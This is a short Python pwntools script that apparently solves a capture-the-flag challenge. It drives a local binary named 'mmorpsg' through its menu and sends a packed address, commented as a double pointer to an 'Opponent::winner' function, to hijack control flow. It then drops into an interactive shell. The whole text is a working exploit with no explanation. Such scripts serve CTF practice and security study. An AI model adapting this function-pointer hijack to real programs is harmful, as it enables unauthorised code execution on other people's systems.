#!/usr/bin/env python

from pwn import *

context.log_level = 'debug'

BINARY = "./mmorpsg"

def main():

    p = process(BINARY)

    p.recv()
    p.sendline("2")
    p.recvuntil('!!')
    p.sendline("3")
    p.recv()
    p.sendline("r")
    p.recv()
    p.sendline("n")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("36")
    p.recv()
    p.sendline(p64(0x408dc0)) # double pointer to Opponent::winner function
    p.recv()
    p.sendline("3")
    p.recv()
    p.sendline("r")

    # Shell
    p.interactive()


if __name__ == "__main__":
    main()
